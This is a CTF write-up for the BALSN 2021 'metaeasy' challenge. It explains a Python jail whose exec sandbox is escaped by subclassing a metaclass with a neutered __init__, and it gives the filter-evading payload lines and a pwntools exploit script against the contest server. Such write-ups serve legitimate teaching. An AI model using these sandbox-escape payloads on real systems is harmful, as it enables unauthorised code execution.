---
title: "BALSN CTF 2021 - Metaeasy (Misc)"
header:
  overlay_image: /assets/images/balsnctf-2021/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Ethan Lin on Unsplash"

tags:
  - balsn
  - writeup
  - misc
  - python
  - metaclasses
---

Summary: Bypass the restrictions of a Python jail to gain access to a get flag function within an
impossible-to-instantiate metaclass class.

```
metaeasy
272
I had set up a service for you to customize your own class.

Enjoy it !!

nc metaeasy.balsnctf.com 19092



Attachment:
- dist.zip

Author: nawmrofed
Verifier: sasdf(1hr)
Verifier: 424275(1~2hr)
```

Attachment: [dist.zip]({{ site.url }}{{ site.baseurl }}/assets/files/balsnctf-2021/b74628302396c7a049611cc1bec61a1a7f402ea50e5d78be3f8e48010ba48722.zip)

Connecting to the service gives us a menu that appears to allow us to build a 'class'.

```console
$ nc metaeasy.balsnctf.com 19092
Welcome!!We have prepared a class named "Guest" for you
1. Add attribute
2. Add method
3. Finish
Option ? :
```

Interacting with the service shows us that the service has the ability to create Python attributes
and functions for a class and then interact with them. The challenge allows three creation
operations and three use/inspect operations.

```console
nc metaeasy.balsnctf.com 19092
Welcome!!We have prepared a class named "Guest" for you
1. Add attribute
2. Add method
3. Finish
Option ? :1
Give me your attribute name :A
Give me your value:12345
1. Add attribute
2. Add method
3. Finish
Option ? :2
Give me your method name :B
Give me your function:print("Hello" + "Person")
1. Add attribute
2. Add method
3. Finish
Option ? :2
Give me your method name :C
Give me your function:print("Value: {}".format(self.A))
Well Done! We Create an instance for you !
1. Inspect attribute
2. Using method
3. Exit
Option ? :1
Please enter the attribute's name :A
A: 12345
1. Inspect attribute
2. Using method
3. Exit
Option ? :1
Please enter the attribute's name :B
You can't access the attribute B
1. Inspect attribute
2. Using method
3. Exit
Option ? :2
Please enter the method's name :B
calling method B...
HelloPerson
done
```

Extracting the attached zip file shows that the source to the challenge is provided to us.

```console
$ unzip b74628302396c7a049611cc1bec61a1a7f402ea50e5d78be3f8e48010ba48722.zip
Archive:  b74628302396c7a049611cc1bec61a1a7f402ea50e5d78be3f8e48010ba48722.zip
   creating: dist/
  inflating: dist/docker-compose.yml
  inflating: dist/Dockerfile
   creating: dist/src/
  inflating: dist/src/challenge.py
 extracting: dist/src/flag
  inflating: dist/src/run.sh
  inflating: dist/xinetd
```

Investigating the `dist/src/challenge.py` Python script shows us the source code to the challenge.
Three classes are defined:

1. `MasterMetaClass` which inherits from the `type` class and appears to contain the mechanism that
   will allow us to obtain the flag through the `IWantGETFLAGPlz` method.
2. `BalsnMetaClass` which inherits from the `type` class and contains a bogus `getFlag` function.
3. `Guest` which uses the `BalsnMetaClass` as the metaclass.

```python
class MasterMetaClass(type):
    def __new__(cls, class_name, class_parents, class_attr):
        def getFlag(self):
            print('Here you go, my master')
            with open('flag') as f:
                print(f.read())
        class_attr[getFlag.__name__] = getFlag
        attrs = ((name, value) for name, value in class_attr.items() if not name.startswith('__'))
        class_attr = dict(('IWant'+name.upper()+'Plz', value) for name, value in attrs)
        newclass = super().__new__(cls, class_name, class_parents, class_attr)
        return newclass
    def __init__(*argv):
        print('Bad guy! No Flag !!')
        raise 'Illegal'

class BalsnMetaClass(type):
    def getFlag(self):
        print('You\'re not Master! No Flag !!')

    def __new__(cls, class_name, class_parents, class_attr):
        newclass = super().__new__(cls, class_name, class_parents, class_attr)
        setattr(newclass, cls.getFlag.__name__, cls.getFlag)
        return newclass

...

class Guest(metaclass = BalsnMetaClass):
    pass
```

Metaclasses allow for the creation of dynamically defined Class (the class, not instance) objects.
By default, typical classes are created with the `type` [standard Python
class](https://docs.python.org/3/reference/datamodel.html#metaclasses). Overriding the `__new__`
method on these classes allows for the customisation of the class creation process. Both
`MasterMetaClass` and `BalsnMetaClass` modifies the class to install get flag methods through this
mechanic.

There is a caveat in the `MasterMetaClass` metaclass. When the class is instantiated, an exception
is raised, preventing us from simply using it. This is the limitation we must overcome to solve the
challenge.

Within the `main` execution block, the first part allows us to modify the `Guest` class by adding
attributes via the `setAttribute(Guest)` call and adding methods with the `setMethod(Guest)` call.
Finally, a `Guest` object is instantiated.

```python
...

if __name__ == '__main__':
    print(f'Welcome!!We have prepared a class named "Guest" for you')
    cnt = 0
    while cnt < 3:
        cnt += 1
        print('1. Add attribute')
        print('2. Add method')
        print('3. Finish')
        x = input("Option ? :")
        if x == "1":
            setAttribute(Guest)
        elif x == "2":
            setMethod(Guest)
        elif x == "3":
            break
        else:
            print("invalid input.")
            cnt -= 1
    print("Well Done! We Create an instance for you !")
    obj = Guest()

    ...
```

The `setAttribute` function is simple and creates a class attribute of a name obtained via the
`setName` method and an alphanumeric value.

```python
def setAttribute(cls):
    attrName = setName('attribute')
    while True:
        attrValue = input(f'Give me your value:')
        if (attrValue.isalnum()):
            break
        else:
            print('Illegal value...')
    setattr(cls, attrName, attrValue)
```

The `setName` function also enforces that the given name is only alphabetic.

```python
def setName(pattern):
    while True:
        name = input(f'Give me your {pattern} name :')
        if (name.isalpha()):
            break
        else:
            print('Illegal Name...')
    return name
```

The `setMethod` function gets user input and passes it to the `createMethod` function before binding
it to the class. The name of the method is also required to be alphabetic since the `setName` method
is used.

```python
def setMethod(cls):
    methodName = setName('method')
    code = input(f'Give me your function:')
    func = createMethod(code)
    setattr(cls, methodName, func)
```

The `createMethod` function checks that the length of the string passed to it is not more than 45
and performs a filter pass to remove all instances of symbols in `' _$#@~'`. Then, it creates a
local wrapper function that executes the code with `exec` with the globals set to `safe_dict` and
the locals only containing `self` which is the created `Guest` object.

```python
def createMethod(code):
    if len(code) > 45:
        print('Too long!! Bad Guy!!')
        return
    for x in ' _$#@~':
        code = code.replace(x,'')
    def wrapper(self):
        exec(code, safe_dict, {'self' : self})
    return wrapper
```

The `safe_dict` used as the globals reduces the amount of standard methods and variables available
to us to use in the created methods. One important thing to note is that access to attributes
containing `__` or even `_` is heavily restricted throughout the entire challenge. Thus, typical
Python jail escape techniques aren't applicable here. The metaclasses are provided, however.

```python
def secure_vars(s):
    attrs = {name:value for name, value in vars(s).items() if not name.startswith('__')}
    return attrs

safe_dict = {
            'BalsnMetaClass' : BalsnMetaClass,
            'MasterMetaClass' : MasterMetaClass,
            'False' : False,
            'True' : True,
            'abs' : abs,
            'all' : all,
            'any' : any,
            'ascii' : ascii,
            'bin' : bin,
            'bool' : bool,
            'bytearray' : bytearray,
            'bytes' : bytes,
            'chr' : chr,
            'complex' : complex,
            'dict' : dict,
            'dir' : dir,
            'divmod' : divmod,
            'enumerate' : enumerate,
            'filter' : filter,
            'float' : float,
            'format' : format,
            'hash' : hash,
            'help' : help,
            'hex' : hex,
            'id' : id,
            'int' : int,
            'iter' : iter,
            'len' : len,
            'list' : list,
            'map' : map,
            'max' : max,
            'min' : min,
            'next' : next,
            'oct' : oct,
            'ord' : ord,
            'pow' : pow,
            'print' : print,
            'range' : range,
            'reversed' : reversed,
            'round' : round,
            'set' : set,
            'slice' : slice,
            'sorted' : sorted,
            'str' : str,
            'sum' : sum,
            'tuple' : tuple,
            'type' : type,
            'vars' : secure_vars,
            'zip' : zip,
            '__builtins__':None
            }
```

In the second part of the main execution block, the `getAttribute` and `callMethod` methods are
called depending on if the user wants to inspect an attribute or use a method.

```python
if __name__ == '__main__':

    ...

    cnt = 0
    while cnt < 3:
        cnt += 1
        print('1. Inspect attribute')
        print('2. Using method')
        print('3. Exit')
        x = input("Option ? :")
        if x == "1":
            getAttribute(obj)
        elif x == "2":
            callMethod(Guest, obj)
        elif x == "3":
            print("Okay...exit...")
            break
        else:
            print("invalid input.")
            cnt -= 1
```

The `getAttribute` method is simple and simply returns non-callable attributes that do not start
with `__`.

```python
def getAttribute(obj):
    attrs = [attr for attr in dir(obj) if not callable(getattr(obj, attr)) and not attr.startswith("__")]
    x = input('Please enter the attribute\'s name :')
    if x not in attrs:
        print(f'You can\'t access the attribute {x}')
        return
    else:
        try:
            print(f'{x}: {getattr(obj, x)}')
        except:
            print("Something went wrong in your attribute...")
            return
```

The `callMethod` method calls the previously created method.

```python
def callMethod(cls, obj):
    attrs = [attr for attr in dir(obj) if callable(getattr(obj, attr)) and not attr.startswith("__")]
    x = input('Please enter the method\'s name :')
    if x not in attrs:
        print(f'You can\'t access the method {x}')
        return
    else:
        try:
            print(f'calling method {x}...')
            cls.__dict__[x](obj)
            print('done')
        except:
            print('Something went wrong in your method...')
            return
```

To proceed, we can modify the script so that the IPython `embed` function is available within the
restricted execution environment.

```python
from IPython import embed;
safe_dict = {
            'embed': embed,
            ...
            }
```

Now we can give ourselves access to the closure our method is executed in through a nice IPython
interpreter.

```console
$ python dist/src/challenge.py
Welcome!!We have prepared a class named "Guest" for you
1. Add attribute
2. Add method
3. Finish
Option ? :2
Give me your method name :pwn
Give me your function:embed()
1. Add attribute
2. Add method
3. Finish
Option ? :3
Well Done! We Create an instance for you !
1. Inspect attribute
2. Using method
3. Exit
Option ? :2
Please enter the method's name :pwn
calling method pwn...
Python 3.9.0 (default, Dec 19 2020, 18:54:26)
Type 'copyright', 'credits' or 'license' for more information
IPython 7.19.0 -- An enhanced Interactive Python. Type '?' for help.
/Users/amon/.pyenv/versions/3.9.0/Python.framework/Versions/3.9/lib/python3.9/site-packages/IPython/terminal/embed.py:285: UserWarning: Failed to get module unknown module
  warnings.warn("Failed to get module %s" % \

In [1]:
```

First, we can try the obvious thing of defining a class that sets the metaclass to
`MasterMetaClass`. This also fails as the metaclass fails to instantiate blocking the `X` class from
even being defined.

```python
In [6]: class X(metaclass=MasterMetaClass):
   ...:     pass
   ...:
---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
<ipython-input-6-3ed452592bc9> in <module>
----> 1 class X(metaclass=MasterMetaClass):
      2     pass
      3

TypeError: 'NoneType' object is not subscriptable

In [7]:
```

Next, we can try to dynamically define a class through `MasterMetaClass` in the way `type` is
typically used. This results in an exception.

```python
In [5]: MasterMetaClass('', (), {})
Bad guy! No Flag !!
---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
<ipython-input-5-b25a678858be> in <module>
----> 1 MasterMetaClass('', (), {})

~/ctf/balsnctf/metaeasy/writeup/dist/src/challenge.py in __init__(*argv)
     12     def __init__(*argv):
     13         print('Bad guy! No Flag !!')
---> 14         raise 'Illegal'
     15
     16 class BalsnMetaClass(type):

TypeError: exceptions must derive from BaseException

In [6]:
```

To overcome the `__init__` exception limitation, we need to replace the instantiation function with
something something that just returns `None`. This can be done dynamically with `type`. This allows
us to create a class from it and instantiate an object containing the `IWantGETFLAGPlz` function
which should give us the flag on the real target.

```python
In [36]: x = type('', (MasterMetaClass,), {'__init__': lambda *x: None})

In [37]: w=x('', (), {})

In [38]: w.IWantGETFLAGPlz(None)
Here you go, my master
---------------------------------------------------------------------------
FileNotFoundError                         Traceback (most recent call last)
<ipython-input-39-c555dbe5d306> in <module>
----> 1 w.IWantGETFLAGPlz(None)

~/ctf/balsnctf/metaeasy/writeup/dist/src/challenge.py in getFlag(self)
      3         def getFlag(self):
      4             print('Here you go, my master')
----> 5             with open('flag') as f:
      6                 print(f.read())
      7         class_attr[getFlag.__name__] = getFlag

FileNotFoundError: [Errno 2] No such file or directory: 'flag'

In [40]:
```

Note the three steps:

1. Creation of the new metaclass with the neutered `__init__`.
2. Creation of a new object through the new metaclass.
3. Calling of the get flag method to obtain the flag.

These steps need to be condensed into three lines of less than 46 characters each and not containing
spaces or `_`. Additionally, the neutered `__init__` method needs to point to a function that
accepts any number of arguments (or four) and returns None in all cases. The function `print` can be
used in this case since it fits the constraints.

Lines to do this were found to be as follows:

1. `s=self;e='\x5f'*2;s.N={e+'init'+e:print}`
2. `s=self;s.O=type('',(MasterMetaClass,),s.N)`
3. `self.O('',(),{}).IWantGETFLAGPlz(0)`

Local testing confirms this.

```console
$ python challenge.py
Welcome!!We have prepared a class named "Guest" for you
1. Add attribute
2. Add method
3. Finish
Option ? :2
Give me your method name :A
Give me your function:s=self;e='\x5f'*2;s.N={e+'init'+e:print}
1. Add attribute
2. Add method
3. Finish
Option ? :2
Give me your method name :B
Give me your function:s=self;s.O=type('',(MasterMetaClass,),s.N)
1. Add attribute
2. Add method
3. Finish
Option ? :2
Give me your method name :C
Give me your function:self.O('',(),{}).IWantGETFLAGPlz(0)
Well Done! We Create an instance for you !
1. Inspect attribute
2. Using method
3. Exit
Option ? :2
Please enter the method's name :A
calling method A...
done
1. Inspect attribute
2. Using method
3. Exit
Option ? :2
Please enter the method's name :B
calling method B...
done
1. Inspect attribute
2. Using method
3. Exit
Option ? :2
Please enter the method's name :C
calling method C...
 () {'getFlag': <function MasterMetaClass.__new__.<locals>.getFlag at 0x108b493a0>}
Here you go, my master
BALSN{test_flag}
done
```

The final exploit is given as follows:

```python
from pwn import *


def create_method(p, key, value):
    '''Creates a method.
    '''
    p.sendline(b'2')
    p.sendline(key)
    p.sendline(value)
    p.recvuntil(b'Option ?')


def use_method(p, key):
    '''Uses a method.
    '''
    p.sendline(b'2')
    p.sendline(key)
    p.recvuntil(b'calling method')


def main():
    # p = process(["python", "./dist/src/challenge.py"])
    p = connect('metaeasy.balsnctf.com', 19092)

    p.recvuntil(b'Option ?')

    stageA = b"s=self;e='\\x5f'*2;s.N={e+'init'+e:print}"
    stageB = b"s=self;s.O=type('',(MasterMetaClass,),s.N)"
    stageC = b"self.O('',(),{}).IWantGETFLAGPlz(0)"

    create_method(p, b'A', stageA)
    create_method(p, b'B', stageB)
    create_method(p, b'C', stageC)

    for i in [b'A', b'B', b'C']:
        use_method(p, i)

    p.recvuntil(b'Here you go, my master\n')
    flag = p.recvline().strip()

    log.success('Flag: {}'.format(flag.decode()))


if __name__ == '__main__':
    main()
```

Executing the final exploit script gives us our flag.

```console
$ python exploit.py
[+] Opening connection to metaeasy.balsnctf.com on port 19092: Done
[+] Flag: BALSN{Metaclasses_Are_Deeper_Magic_Than_99%_Of_Users_Should_Ever_Worry_About._If_You_Wonder_Whether_You_Need_Them,_You_Don't.-Tim_Peters_DE8560A2}
```

**Flag:** `BALSN{Metaclasses_Are_Deeper_Magic_Than_99%_Of_Users_Should_Ever_Worry_About._If_You_Wonder_Whether_You_Need_Them,_You_Don't.-Tim_Peters_DE8560A2}`

PS: Check out the insane unintended solution using generators by
[maple3142](https://blog.maple3142.net/2021/11/21/balsn-ctf-2021-writeups/#metaeasy).
